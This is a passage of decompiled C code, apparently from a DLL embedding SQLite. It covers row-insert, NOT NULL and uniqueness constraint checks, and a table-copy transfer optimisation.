        while ( v77 < *(_DWORD *)(v9 + 12) );
      }
      if ( !v60 )
      {
        sub_1005ABE8((int)v81, 29, v80 + 1, *(_DWORD *)(v9 + 12));
        sub_100792A9(v9, v81);
      }
      sub_100735BF(v6, v63, 105, 0, 1, v9, v80 - *(_DWORD *)(v9 + 12) - 1, a6, v78);
      v6 = sub_10078AC8(a1, v80, *(_DWORD *)(v9 + 12) + 1);
    }
    if ( v60 )
      goto LABEL_146;
    if ( (*(_BYTE *)(v9 + 34) & 0x10) != 0 )
      sub_1005ABE8((int)v81, 10, 0, v76);
    if ( v73 < 0 )
    {
      if ( (*(_BYTE *)(v9 + 34) & 0x10) != 0 )
      {
        sub_1005ABE8((int)v81, 10, 0, v79);
LABEL_118:
        sub_1007950C(v6, (int)v69, v79);
        v45 = *(_DWORD *)(v9 + 12) <= 0;
        v80 = 0;
        v77 = 0;
        if ( !v45 )
        {
          v69 = 0;
          v79 = v66;
          do
          {
            v46 = a5;
            if ( v77 == *(_DWORD *)(v9 + 8) )
            {
              sub_1005ABE8((int)v81, 10, 0, v79);
              goto LABEL_128;
            }
            if ( a5 )
            {
              v47 = 0;
              if ( (int)a5[1] <= 0 )
                goto LABEL_137;
              v48 = (_DWORD *)(*a5 + 4);
              do
              {
                v46 = a5;
                if ( *v48 == v77 )
                  break;
                ++v47;
                v48 += 2;
              }
              while ( v47 < (int)a5[1] );
            }
            else
            {
              if ( *((_BYTE *)v69 + *(_DWORD *)(v9 + 16) + 23) )
              {
                ++v80;
LABEL_126:
                sub_10077F49((int *)v6, v79, *(unsigned __int8 **)((char *)v69 + *(_DWORD *)(v9 + 16) + 4));
                goto LABEL_127;
              }
              v47 = v77 - v80;
            }
            if ( v47 < 0 )
              goto LABEL_126;
LABEL_137:
            if ( !v72 || v46 && v47 >= (int)v46[1] )
              goto LABEL_126;
            if ( v68 )
            {
              sub_1005AB66((int)v81, 28, v70, v47, v79);
              goto LABEL_128;
            }
            if ( a4 )
            {
              sub_1005ABE8((int)v81, 15, v61 + v47, v79);
              goto LABEL_128;
            }
            sub_10077F49((int *)v6, v79, *(unsigned __int8 **)(20 * v47 + a3[3]));
LABEL_127:
            v6 = a1;
LABEL_128:
            ++v77;
            ++v79;
            v69 += 6;
          }
          while ( v77 < *(_DWORD *)(v9 + 12) );
        }
        if ( (*(_BYTE *)(v9 + 34) & 0x10) != 0 )
        {
          v64 = (unsigned __int16 *)sub_10070E9E(v9, v75);
          sub_10071860((int *)v6, v9);
          sub_1005AC02(v81, 129, 1, *(_DWORD *)(v9 + 12) + 2, v76, v64, (_BYTE *)0xFFFFFFF6);
          sub_1006CB6D((_DWORD *)v6);
        }
        else
        {
          sub_1007A25D((int *)v6, v9, v67, v76, v65, v73 >= 0, 0, a6, (int)v78, &v64);
          sub_10081142((int *)v6, (_DWORD *)v9, 0, v76);
          sub_1007A82F(v9, v6, v67, v76, v65, 0, v56, v64 == 0);
        }
LABEL_146:
        if ( (*(_WORD *)(v75 + 12) & 0x1000) != 0 )
          sub_1005ABE8((int)v81, 20, v57, 1);
        if ( v63 )
          sub_100735BF(v6, v63, 105, 0, 2, v9, v66 - *(_DWORD *)(v9 + 12) - 2, a6, v78);
        v49 = v81;
        sub_1005ACAF((int)v81, (int)v78);
        if ( v68 )
        {
          sub_1005ABE8((int)v49, 66, v70, v59);
          sub_1005AE20(v58, (int)v49);
          sub_1005ABD1((int)v49, 42, v70);
        }
        else if ( a4 )
        {
          sub_1005ABE8((int)v49, 1, 0, v59);
          sub_1005AE20(v58, (int)v49);
        }
        if ( (*(_BYTE *)(v9 + 34) & 0x10) == 0 && !v60 )
        {
          v50 = v67;
          sub_1005ABD1((int)v49, 42, v67);
          v51 = *(_DWORD *)(v9 + 20);
          if ( v51 )
          {
            v52 = v50 + 1;
            do
            {
              sub_1005ABD1((int)v49, 42, v52);
              v51 = *(_DWORD *)(v51 + 32);
              ++v52;
            }
            while ( v51 );
          }
        }
        v6 = a1;
        goto LABEL_160;
      }
      sub_1005AB66((int)v81, 53, v67, v79, (int)v69);
    }
    else
    {
      if ( v68 )
      {
        sub_1005AB66((int)v81, 28, v70, v73, v79);
LABEL_110:
        if ( (*(_BYTE *)(v9 + 34) & 0x10) != 0 )
        {
          sub_1005ABE8((int)v81, 73, v79, v81[3] + 2);
        }
        else
        {
          v44 = sub_1005ABD1((int)v81, 74, v79);
          sub_1005AB66((int)v81, 53, v67, v79, (int)v69);
          sub_1005AE20(v44, (int)v81);
        }
        sub_1005ABD1((int)v81, 21, v79);
        goto LABEL_118;
      }
      if ( a4 )
      {
        sub_1005ABE8((int)v81, 15, v73 + v61, v79);
        goto LABEL_110;
      }
      v41 = v79;
      sub_10077F49((int *)v6, v79, *(unsigned __int8 **)(20 * v73 + a3[3]));
      v42 = sub_1005B0D5(-1, v81);
      if ( !v42 || *(_BYTE *)v42 != 10 || (*(_BYTE *)(v9 + 34) & 0x10) != 0 )
      {
        v6 = a1;
        goto LABEL_110;
      }
      v6 = a1;
      v42[1] = v67;
      v42[2] = v41;
      v43 = v69;
      *(_BYTE *)v42 = 53;
      v42[3] = v43;
    }
    v56 = 1;
    goto LABEL_118;
  }
LABEL_160:
  if ( !*(_BYTE *)(v6 + 19) && !*(_DWORD *)(v6 + 428) )
    sub_1007952A((int *)v6);
  if ( (*(_WORD *)(v75 + 12) & 0x1000) != 0 && !*(_BYTE *)(v6 + 19) && !*(_DWORD *)(v6 + 428) )
  {
    sub_1005ABE8((int)v81, 16, v57, 1);
    v53 = v81;
    sub_1005B4BC(1, (int)v81);
    sub_1005B518((int)v53, 0, 0, aRowsInserted, 0);
  }
LABEL_167:
  sub_1006C7F7((__int16 *)a2, v75);
  sub_100767B1(a3, v75);
  sub_1007B016(v75, (unsigned int)a4);
  sub_1006C5DA(a5, v75);
  sub_10058EC7(v75, v65);
}
// 100735BF: using guessed type _DWORD __cdecl sub_100735BF(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (1007A25D) --------------------------------------------------------
_DWORD *__cdecl sub_1007A25D(int *a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9, _DWORD *a10)
{
  int *v10; // esi
  _DWORD *v11; // eax
  _BYTE *v12; // ecx
  int v13; // eax
  int v14; // eax
  int v15; // edx
  unsigned __int16 *v16; // eax
  int v17; // edi
  int v18; // eax
  int v19; // esi
  int *v20; // eax
  int v21; // esi
  int v22; // eax
  int v23; // ebx
  bool v24; // zf
  char *v25; // eax
  int v26; // esi
  bool v27; // cc
  int v28; // edi
  int v29; // eax
  unsigned __int16 *v30; // eax
  int v31; // eax
  int v32; // esi
  int v33; // eax
  int v34; // edi
  int *v35; // eax
  int v36; // eax
  char *v37; // eax
  unsigned __int16 *v38; // edi
  int v39; // esi
  int *v40; // ecx
  int v41; // eax
  _DWORD *result; // eax
  int v43; // [esp-4h] [ebp-54h]
  int v44[6]; // [esp+Ch] [ebp-44h] BYREF
  char v45; // [esp+24h] [ebp-2Ch]
  char v46; // [esp+25h] [ebp-2Bh]
  char v47; // [esp+26h] [ebp-2Ah]
  _BYTE *v48; // [esp+28h] [ebp-28h]
  int v49; // [esp+2Ch] [ebp-24h]
  int v50; // [esp+30h] [ebp-20h]
  int v51; // [esp+34h] [ebp-1Ch]
  char *v52; // [esp+38h] [ebp-18h]
  int v53; // [esp+3Ch] [ebp-14h]
  int v54; // [esp+40h] [ebp-10h]
  int v55; // [esp+44h] [ebp-Ch]
  int v56; // [esp+48h] [ebp-8h]
  int v57; // [esp+4Ch] [ebp-4h]
  int v58; // [esp+6Ch] [ebp+1Ch]
  int v59; // [esp+6Ch] [ebp+1Ch]

  v10 = a1;
  v52 = 0;
  v54 = 0;
  if ( a6 && a7 )
    v50 = a6;
  else
    v50 = a4;
  v11 = sub_1007C271(a1);
  v12 = *(_BYTE **)(a2 + 12);
  v57 = (int)v11;
  v53 = a4 + 1;
  v13 = 0;
  v48 = v12;
  v51 = 0;
  if ( (int)v12 > 0 )
  {
    v55 = 0;
    v56 = v53;
    do
    {
      if ( v13 == *(_DWORD *)(a2 + 8) )
        goto LABEL_24;
      v14 = v55 + *(_DWORD *)(a2 + 16);
      v15 = *(unsigned __int8 *)(v14 + 20);
      if ( !*(_BYTE *)(v14 + 20) )
        goto LABEL_24;
      if ( a8 == 99 )
      {
        if ( v15 == 99 )
          v15 = 2;
      }
      else
      {
        v15 = a8;
      }
      if ( v15 == 5 && !*(_DWORD *)(v14 + 4) )
        v15 = 2;
      if ( v15 != 1 )
      {
        if ( v15 == 2 )
        {
          sub_1006CB6D(v10);
        }
        else if ( v15 != 3 )
        {
          if ( v15 == 4 )
          {
            sub_1005ABE8(v57, 73, v56, a9);
          }
          else
          {
            v49 = sub_1005ABD1(v57, 74, v56);
            sub_10077F49(a1, v56, *(unsigned __int8 **)(v55 + *(_DWORD *)(a2 + 16) + 4));
            sub_1005AE20(v49, v57);
            v10 = a1;
          }
          goto LABEL_24;
        }
      }
      sub_1005AB66(v57, 5, 19, v15, v56);
      v16 = (unsigned __int16 *)sub_10055484(
                                  *a1,
                                  "%s.%s may not be NULL",
                                  *(const char **)(a2 + 4),
                                  *(const char **)(v55 + *(_DWORD *)(a2 + 16)));
      sub_1005AFA8(-1, (int *)v57, v16, (_BYTE *)0xFFFFFFFF);
      v10 = a1;
LABEL_24:
      v55 += 24;
      v13 = v51 + 1;
      ++v56;
      ++v51;
    }
    while ( v51 < (int)v48 );
  }
  if ( *(_DWORD *)(a2 + 44) && (*(_DWORD *)(*v10 + 12) & 0x40000) == 0 )
  {
    v17 = sub_1005AC63(v57);
    v10[20] = v53;
    sub_100781A9(v10, *(unsigned __int8 **)(a2 + 44), v17, 8);
    v18 = a8;
    if ( a8 == 99 )
      v18 = 2;
    if ( v18 == 4 )
      sub_1005ABE8(v57, 1, 0, a9);
    else
      sub_1006CB81(v10, v18, 0, 0);
    sub_1005ACAF(v57, v17);
  }
  if ( !a6 )
    goto LABEL_61;
  v19 = *(unsigned __int8 *)(a2 + 35);
  if ( a8 == 99 )
  {
    if ( v19 == 99 )
      v19 = 2;
  }
  else
  {
    v19 = a8;
  }
  if ( a7 )
    v52 = (char *)sub_1005AB66(v57, 76, a4, 0, a6);
  v51 = sub_1005AB66(v57, 51, a3, 0, a4);
  if ( v19 <= 0 )
  {
LABEL_57:
    v19 = 2;
    goto LABEL_58;
  }
  if ( v19 > 3 )
  {
    if ( v19 == 4 )
    {
      sub_1005ABE8(v57, 1, 0, a9);
      goto LABEL_59;
    }
    if ( v19 == 5 )
    {
      v20 = a1;
      v21 = 0;
      if ( (*(_DWORD *)(*a1 + 12) & 0x2000000) != 0 )
      {
        v21 = sub_100730F2(a1, a2, 106, 0, 0);
        v20 = a1;
      }
      if ( v20[106] )
        v20 = (int *)v20[106];
      *((_BYTE *)v20 + 344) = 1;
      if ( v21 || ((*(_DWORD *)(*a1 + 12) & 0x4000000) == 0 ? (v22 = 0) : (v22 = sub_1008146C((_DWORD *)a2, 0, 0)), v22) )
        sub_10080683(a1, a2, a3, a4, 0, v21, 5);
      else
        sub_10080855(a2, a1, a3, 0);
      v54 = 1;
      goto LABEL_59;
    }
    goto LABEL_57;
  }
LABEL_58:
  sub_1006CB81(a1, v19, (unsigned __int16 *)aPrimaryKeyMust, (_BYTE *)0xFFFFFFFE);
LABEL_59:
  sub_1005AE20(v51, v57);
  if ( a7 )
    sub_1005AE20((int)v52, v57);
LABEL_61:
  v56 = 0;
  v23 = *(_DWORD *)(a2 + 20);
  while ( v23 )
  {
    v24 = *(_DWORD *)(a5 + 4 * v56) == 0;
    v48 = (_BYTE *)(a5 + 4 * v56);
    if ( v24 )
      goto LABEL_99;
    v25 = (char *)sub_10078AA4(a1, *(_DWORD *)(v23 + 4) + 1);
    v26 = 0;
    v27 = *(_DWORD *)(v23 + 4) <= 0;
    v28 = (int)v25;
    v52 = v25;
    if ( !v27 )
    {
      v58 = (int)v25;
      do
      {
        v29 = *(_DWORD *)(*(_DWORD *)(v23 + 8) + 4 * v26);
        if ( v29 == *(_DWORD *)(a2 + 8) )
          sub_1005ABE8(v57, 15, a4, v58);
        else
          sub_1005ABE8(v57, 15, v53 + v29, v58);
        ++v26;
        ++v58;
      }
      while ( v26 < *(_DWORD *)(v23 + 4) );
    }
    sub_1005ABE8(v57, 15, a4, v28 + v26);
    sub_1005AB66(v57, 30, v28, *(_DWORD *)(v23 + 4) + 1, *(_DWORD *)v48);
    v30 = (unsigned __int16 *)sub_10079249((int *)v57, (_DWORD *)v23);
    sub_1005AFA8(-1, (int *)v57, v30, 0);
    v31 = sub_100772A8((int)a1, *(_DWORD *)(v23 + 4) + 1, v28);
    v32 = *(unsigned __int8 *)(v23 + 24);
    if ( !*(_BYTE *)(v23 + 24) )
    {
      sub_10078AC8(v31, (int)v52, *(_DWORD *)(v23 + 4) + 1);
      goto LABEL_99;
    }
    if ( a8 == 99 )
    {
      if ( v32 == 99 )
        v32 = 2;
    }
    else
    {
      v32 = a8;
    }
    if ( v54 )
    {
      if ( v32 == 4 )
      {
        v43 = 5;
      }
      else
      {
        if ( v32 != 3 )
          goto LABEL_81;
        v43 = 2;
      }
      v32 = v43;
    }
LABEL_81:
    v55 = sub_10078A55(v31);
    sub_1005ABE8(v57, 15, v50, v55);
    v33 = sub_1005AC02((int *)v57, 50, v56 + a3 + 1, 0, v55, (unsigned __int16 *)v52, (_BYTE *)0xFFFFFFF2);
    v34 = *(_DWORD *)(v23 + 4);
    v51 = v33;
    v35 = (int *)sub_10078AC8((int)a1, (int)v52, v34 + 1);
    if ( v32 <= 0 )
      goto LABEL_93;
    if ( v32 <= 3 )
    {
      v44[0] = *v35;
      v36 = *(_DWORD *)(v23 + 4);
      memset(&v44[1], 0, 16);
      v44[5] = 200;
      v46 = 1;
      v47 = 0;
      v45 = 0;
      v52 = aColumns;
      if ( v36 <= 1 )
        v52 = aColumn;
      v59 = 0;
      if ( v36 > 0 )
      {
        do
        {
          v48 = *(_BYTE **)(24 * *(_DWORD *)(*(_DWORD *)(v23 + 8) + 4 * v59) + *(_DWORD *)(a2 + 16));
          sub_100552D1(-1, (int)v44, v52);
          v52 = asc_1017F834;
          sub_100552D1(-1, (int)v44, v48);
          ++v59;
        }
        while ( v59 < *(_DWORD *)(v23 + 4) );
      }
      v37 = aAreNotUnique;
      if ( *(int *)(v23 + 4) <= 1 )
        v37 = aIsNotUnique;
      sub_100552D1(-1, (int)v44, v37);
      v38 = (unsigned __int16 *)sub_1005539C((int)v44);
      sub_1006CB81(a1, v32, v38, 0);
      sub_10058EC7(v44[0], (unsigned int)v38);
    }
    else
    {
      if ( v32 != 4 )
      {
LABEL_93:
        v39 = (int)a1;
        v40 = (int *)a1[106];
        v41 = 0;
        if ( !v40 )
          v40 = a1;
        *((_BYTE *)v40 + 344) = 1;
        if ( (*(_DWORD *)(*a1 + 12) & 0x2000000) != 0 )
          v41 = sub_100730F2(a1, a2, 106, 0, 0);
        sub_10080683(a1, a2, a3, v55, 0, v41, 5);
        v54 = 1;
        goto LABEL_98;
      }
      sub_1005ABE8(v57, 1, 0, a9);
    }
    v39 = (int)a1;
LABEL_98:
    sub_1005AE20(v51, v57);
    sub_10078A70(v39, v55);
LABEL_99:
    v23 = *(_DWORD *)(v23 + 32);
    ++v56;
  }
  result = a10;
  if ( a10 )
    *a10 = v54;
  return result;
}
// 1007A35A: variable 'v15' is possibly undefined
// 10080683: using guessed type _DWORD __cdecl sub_10080683(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (1007A82F) --------------------------------------------------------
int __usercall sub_1007A82F@<eax>(int a1@<ebx>, int a2, int a3, int a4, int a5, int a6, int a7, int a8)
{
  int v8; // eax
  int v9; // esi
  int v12; // [esp+Ch] [ebp-8h]
  int *v13; // [esp+10h] [ebp-4h]
  char v14; // [esp+1Fh] [ebp+Bh]

  v13 = sub_1007C271((int *)a2);
  v8 = *(_DWORD *)(a1 + 20);
  v9 = 0;
  while ( v8 )
  {
    v8 = *(_DWORD *)(v8 + 32);
    ++v9;
  }
  while ( --v9 >= 0 )
  {
    if ( *(_DWORD *)(a5 + 4 * v9) )
    {
      sub_1005ABE8((int)v13, 67, v9 + a3 + 1, *(_DWORD *)(a5 + 4 * v9));
      if ( a8 )
        sub_1005AE0E((int)v13, 16);
    }
  }
  v12 = sub_10078A55(a2);
  sub_1005AB66((int)v13, 30, a4 + 1, *(_DWORD *)(a1 + 12), v12);
  sub_100792A9(a1, v13);
  sub_100772A8(a2, *(_DWORD *)(a1 + 12), a4 + 1);
  if ( *(_BYTE *)(a2 + 19) )
    v14 = 0;
  else
    v14 = (2 * (a6 != 0) + 2) | 1;
  if ( a7 )
    v14 |= 8u;
  if ( a8 )
    v14 |= 0x10u;
  sub_1005AB66((int)v13, 54, a3, v12, a4);
  if ( !*(_BYTE *)(a2 + 19) )
    sub_1005AFA8(-1, v13, *(unsigned __int16 **)(a1 + 4), (_BYTE *)0xFFFFFFFE);
  return sub_1005AE0E((int)v13, v14);
}

//----- (1007A92E) --------------------------------------------------------
int __usercall sub_1007A92E@<eax>(int *a1@<eax>, int a2@<ebx>, int a3, int a4)
{
  _DWORD *v6; // esi
  int v7; // ecx
  unsigned __int16 *v8; // eax
  int *v9; // [esp+Ch] [ebp-Ch]
  int v10; // [esp+10h] [ebp-8h]
  int v11; // [esp+14h] [ebp-4h]

  if ( (*(_BYTE *)(a2 + 34) & 0x10) != 0 )
    return 0;
  v10 = sub_1005855F(*a1, *(_DWORD *)(a2 + 68));
  v9 = sub_1007C271(a1);
  sub_100791F0(a2, a1, a3, v10, a4);
  v6 = *(_DWORD **)(a2 + 20);
  v7 = 1;
  v11 = 1;
  if ( v6 )
  {
    do
    {
      v8 = (unsigned __int16 *)sub_1006CBB6(a1, v6);
      sub_1005AC02(v9, a4, a3 + v11, v6[5], v10, v8, (_BYTE *)0xFFFFFFF0);
      v6 = (_DWORD *)v6[8];
      ++v11;
    }
    while ( v6 );
    v7 = v11;
  }
  if ( a1[17] < v7 + a3 )
    a1[17] = v7 + a3;
  return v7 - 1;
}

//----- (1007A9C0) --------------------------------------------------------
BOOL __fastcall sub_1007A9C0(unsigned __int8 *a1, unsigned __int8 *a2)
{
  if ( !a1 )
    return a2 == 0;
  if ( a2 )
    return sub_100593BE(a1, a2) == 0;
  return 0;
}

//----- (1007A9DE) --------------------------------------------------------
int __usercall sub_1007A9DE@<eax>(int a1@<edi>, int a2@<esi>)
{
  int v2; // eax
  int v4; // ebx
  int v5; // ecx
  int v6; // [esp+0h] [ebp-4h]

  v2 = *(_DWORD *)(a2 + 4);
  if ( *(_DWORD *)(a1 + 4) != v2 || *(_BYTE *)(a1 + 24) != *(_BYTE *)(a2 + 24) )
    return 0;
  v4 = 0;
  if ( v2 <= 0 )
    return 1;
  v5 = *(_DWORD *)(a1 + 8) - *(_DWORD *)(a2 + 8);
  v6 = v5;
  while ( *(_DWORD *)(*(_DWORD *)(a2 + 8) + 4 * v4) == *(_DWORD *)(v5 + *(_DWORD *)(a2 + 8) + 4 * v4)
       && *(_BYTE *)(v4 + *(_DWORD *)(a2 + 40)) == *(_BYTE *)(v4 + *(_DWORD *)(a1 + 40))
       && sub_1007A9C0(
            *(unsigned __int8 **)(*(_DWORD *)(a2 + 44) + 4 * v4),
            *(unsigned __int8 **)(*(_DWORD *)(a1 + 44) + 4 * v4)) )
  {
    if ( ++v4 >= *(_DWORD *)(a2 + 4) )
      return 1;
    v5 = v6;
  }
  return 0;
}

//----- (1007AA4D) --------------------------------------------------------
int __usercall sub_1007AA4D@<eax>(int *a1@<eax>, int a2@<ecx>, int a3, int a4, int a5)
{
  int v8; // eax
  int v9; // esi
  int *v10; // eax
  int *v11; // esi
  int v12; // eax
  int v13; // edi
  int v14; // eax
  int v15; // edi
  int v16; // esi
  int *v17; // edi
  int v18; // eax
  int v19; // esi
  int v20; // esi
  int v21; // eax
  _DWORD *v22; // ebx
  _DWORD *v23; // esi
  unsigned __int16 *v24; // eax
  unsigned __int16 *v25; // eax
  int v26; // esi
  int v27; // eax
  int v28; // [esp+Ch] [ebp-30h]
  int v29; // [esp+10h] [ebp-2Ch]
  int *v30; // [esp+14h] [ebp-28h]
  _DWORD *v31; // [esp+18h] [ebp-24h]
  int v32; // [esp+1Ch] [ebp-20h]
  int v33; // [esp+20h] [ebp-1Ch]
  int v34; // [esp+24h] [ebp-18h]
  int v35; // [esp+24h] [ebp-18h]
  int v36; // [esp+28h] [ebp-14h]
  int i; // [esp+2Ch] [ebp-10h]
  int v38; // [esp+2Ch] [ebp-10h]
  int v39; // [esp+30h] [ebp-Ch]
  int v40; // [esp+30h] [ebp-Ch]
  int v41; // [esp+30h] [ebp-Ch]
  int v42; // [esp+34h] [ebp-8h]
  int v43; // [esp+38h] [ebp-4h]

  v34 = 0;
  if ( !a1 || sub_1007281E((_BYTE *)a3, a2) || (*(_BYTE *)(a2 + 34) & 0x10) != 0 )
    return 0;
  if ( a4 == 99 )
    a4 = 2;
  if ( a4 != 2 && a4 != 1 )
    return 0;
  v8 = a1[2];
  if ( *(_WORD *)v8 != 1 )
    return 0;
  if ( *(_DWORD *)(v8 + 24) )
    return 0;
  if ( a1[3] )
    return 0;
  if ( a1[6] )
    return 0;
  if ( a1[4] )
    return 0;
  if ( a1[10] )
    return 0;
  if ( a1[7] )
    return 0;
  if ( (*((_BYTE *)a1 + 6) & 1) != 0 )
    return 0;
  v9 = *a1;
  if ( *(_DWORD *)v9 != 1 )
    return 0;
  if ( ***(_BYTE ***)(v9 + 12) != 113 )
    return 0;
  v10 = sub_10069EB7(a3, 0, *(unsigned __int8 **)(v8 + 12), *(unsigned __int8 **)(v8 + 8));
  v11 = v10;
  v36 = (int)v10;
  if ( !v10 )
    return 0;
  if ( v10 == (int *)a2 )
    return 0;
  if ( (*((_BYTE *)v10 + 34) & 0x10) != 0 )
    return 0;
  if ( v10[7] )
    return 0;
  v12 = *(_DWORD *)(a2 + 12);
  if ( v12 != v11[3] || *(_DWORD *)(a2 + 8) != v11[2] )
    return 0;
  v39 = 0;
  if ( v12 > 0 )
  {
    v13 = *(_DWORD *)(a2 + 16) + 16;
    v14 = v11[4] + 16;
    for ( i = v14;
          *(_BYTE *)(v13 + 6) == *(_BYTE *)(v14 + 6)
       && sub_1007A9C0(*(unsigned __int8 **)v13, *(unsigned __int8 **)v14)
       && (!*(_BYTE *)(v13 + 4) || *(_BYTE *)(i + 4));
          v14 = i )
    {
      ++v39;
      i += 24;
      v13 += 24;
      if ( v39 >= *(_DWORD *)(a2 + 12) )
        goto LABEL_33;
    }
    return 0;
  }
LABEL_33:
  v15 = *(_DWORD *)(a2 + 20);
  while ( v15 )
  {
    if ( *(_BYTE *)(v15 + 24) )
      v34 = 1;
    v16 = v11[5];
    if ( !v16 )
      return 0;
    do
    {
      if ( sub_1007A9DE(v15, v16) )
        break;
      v16 = *(_DWORD *)(v16 + 32);
    }
    while ( v16 );
    if ( !v16 )
      return 0;
    v15 = *(_DWORD *)(v15 + 32);
    v11 = (int *)v36;
  }
  if ( *(_DWORD *)(a2 + 44) && !sub_10078638(v11[11], *(_DWORD *)(a2 + 44)) )
    return 0;
  v33 = sub_1005855F(*(_DWORD *)a3, v11[17]);
  v17 = sub_1007C271((int *)a3);
  v30 = v17;
  sub_1006CAC0((int *)a3, v33);
  v18 = *(_DWORD *)(a3 + 68);
  v19 = v18 + 1;
  v43 = v18;
  v42 = v18 + 1;
  *(_DWORD *)(a3 + 68) = v18 + 2;
  v31 = sub_10079388((int *)a3, a2, a5);
  sub_100791F0(a2, (int *)a3, v19, a5, 39);
  if ( *(int *)(a2 + 8) < 0 && *(_DWORD *)(a2 + 20) || v34 )
  {
    v40 = sub_1005ABE8((int)v17, 64, v42, 0);
    v35 = sub_1005AB66((int)v17, 1, 0, 0, 0);
    sub_1005AE20(v40, (int)v17);
  }
  else
  {
    v35 = 0;
  }
  sub_100791F0(v36, (int *)a3, v43, v33, 38);
  v28 = sub_1005ABE8((int)v17, 64, v43, 0);
  v38 = sub_10078A55(a3);
  v20 = sub_10078A55(a3);
  v29 = v20;
  if ( *(int *)(a2 + 8) < 0 )
  {
    if ( *(_DWORD *)(a2 + 20) )
      v21 = sub_1005ABE8((int)v17, 60, v43, v20);
    else
      v21 = sub_1005ABE8((int)v17, 53, v42, v20);
    v41 = v21;
  }
  else
  {
    v41 = sub_1005ABE8((int)v17, 60, v43, v20);
    v32 = sub_1005AB66((int)v17, 51, v42, 0, v20);
    sub_1006CB81((int *)a3, a4, (unsigned __int16 *)aPrimaryKeyMust_0, (_BYTE *)0xFFFFFFFE);
    sub_1005AE20(v32, (int)v17);
    sub_1007950C(a3, (int)v31, v20);
  }
  sub_1005ABE8((int)v17, 59, v43, v38);
  sub_1005AB66((int)v17, 54, v42, v38, v20);
  sub_1005AE0E((int)v17, 11);
  sub_1005AFA8(-1, v17, *(unsigned __int16 **)(a2 + 4), 0);
  sub_1005ABE8((int)v17, 66, v43, v41);
  v22 = *(_DWORD **)(a2 + 20);
  if ( v22 )
  {
    do
    {
      v23 = *(_DWORD **)(v36 + 20);
      if ( v23 )
      {
        do
        {
          if ( sub_1007A9DE((int)v22, (int)v23) )
            break;
          v23 = (_DWORD *)v23[8];
        }
        while ( v23 );
        v17 = v30;
      }
      sub_1005ABE8((int)v17, 42, v43, 0);
      sub_1005ABE8((int)v17, 42, v42, 0);
      v24 = (unsigned __int16 *)sub_1006CBB6((int *)a3, v23);
      sub_1005AC02(v17, 38, v43, v23[5], v33, v24, (_BYTE *)0xFFFFFFF0);
      v25 = (unsigned __int16 *)sub_1006CBB6((int *)a3, v22);
      sub_1005AC02(v17, 39, v42, v22[5], a5, v25, (_BYTE *)0xFFFFFFF0);
      v26 = sub_1005ABE8((int)v17, 64, v43, 0);
      sub_1005ABE8((int)v17, 58, v43, v38);
      sub_1005AB66((int)v17, 67, v42, v38, 1);
      sub_1005ABE8((int)v17, 66, v43, v26 + 1);
      sub_1005AE20(v26, (int)v17);
      v22 = (_DWORD *)v22[8];
    }
    while ( v22 );
    v20 = v29;
  }
  sub_1005AE20(v28, (int)v17);
  v27 = sub_10078A70(a3, v20);
  sub_10078A70(v27, v38);
  sub_1005ABE8((int)v17, 42, v43, 0);
  sub_1005ABE8((int)v17, 42, v42, 0);
  if ( v35 )
  {
    sub_1005AB66((int)v17, 6, 0, 0, 0);
    sub_1005AE20(v35, (int)v17);
    sub_1005ABE8((int)v17, 42, v42, 0);
    return 0;
  }
  return 1;
}

//----- (1007AEDD) --------------------------------------------------------
int __cdecl sub_1007AEDD(int a1, int a2)
{
  unsigned int v2; // edi

  sub_100767B1(*(int **)a2, a1);
  sub_1006C7F7(*(__int16 **)(a2 + 8), a1);
  sub_10075FD8(a1, *(_DWORD *)(a2 + 12));
  sub_100767B1(*(int **)(a2 + 16), a1);
  sub_10075FD8(a1, *(_DWORD *)(a2 + 20));
  sub_100767B1(*(int **)(a2 + 24), a1);
  v2 = *(_DWORD *)(a2 + 28);
  if ( v2 )
  {
    sub_1007AEDD(a1, *(_DWORD *)(a2 + 28));
    sub_10058EC7(a1, v2);
  }
  sub_10075FD8(a1, *(_DWORD *)(a2 + 40));
  return sub_10075FD8(a1, *(_DWORD *)(a2 + 44));
}
// 10075FD8: using guessed type _DWORD __cdecl sub_10075FD8(_DWORD, _DWORD);

//----- (1007AF57) --------------------------------------------------------
char *__usercall sub_1007AF57@<eax>(
        int *a1@<eax>,
        int *a2,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10)
{
  int v11; // edi
  char *v12; // esi
  _DWORD *v13; // eax
  char v15[72]; // [esp+Ch] [ebp-48h] BYREF

  v11 = *a2;
  v12 = (char *)sub_1005904B(*a2, 0x44u);
  if ( !v12 )
  {
    v12 = v15;
    memset(v15, 0, 0x44u);
  }
  if ( !a1 )
  {
    v13 = sub_10075D3B(v11, 113);
    a1 = sub_100766CA(a2, 0, (unsigned int)v13);
  }
  *((_DWORD *)v12 + 2) = a3;
  *((_DWORD *)v12 + 3) = a4;
  *((_DWORD *)v12 + 4) = a5;
  *((_DWORD *)v12 + 5) = a6;
  *((_DWORD *)v12 + 6) = a7;
  *(_DWORD *)v12 = a1;
  *((_DWORD *)v12 + 14) = -1;
  *((_DWORD *)v12 + 15) = -1;
  *((_DWORD *)v12 + 16) = -1;
  v12[4] = 116;
  *((_WORD *)v12 + 3) = a8 != 0;
  *((_DWORD *)v12 + 10) = a9;
  *((_DWORD *)v12 + 11) = a10;
  if ( *(_BYTE *)(v11 + 30) )
  {
    sub_1007AEDD(v11, (int)v12);
    if ( v12 != v15 )
      sub_10058EC7(v11, (unsigned int)v12);
    return 0;
  }
  return v12;
}

//----- (1007B016) --------------------------------------------------------
void __cdecl sub_1007B016(int a1, unsigned int a2)
{
  if ( a2 )
  {
    sub_1007AEDD(a1, a2);
    sub_10058EC7(a1, a2);
  }
}

//----- (1007B034) --------------------------------------------------------
int __cdecl sub_1007B034(int *a1, int a2, int a3, int a4)
{
  int v4; // esi
  int v5; // ebx
  unsigned __int8 *v6; // edi
  char *v7; // eax
  int v9[3]; // [esp+10h] [ebp-18h]
  int v10; // [esp+1Ch] [ebp-Ch]
  int v11; // [esp+20h] [ebp-8h]
  int v12; // [esp+24h] [ebp-4h]

  v12 = 0;
  v10 = 0;
  v9[0] = a2;
  v9[1] = a3;
  v9[2] = a4;
  do
  {
    v4 = v9[v10];
    if ( !v4 )
      break;
    v11 = 0;
    v5 = *(_DWORD *)(v4 + 4);
    v6 = (unsigned __int8 *)&unk_100FE5D0;
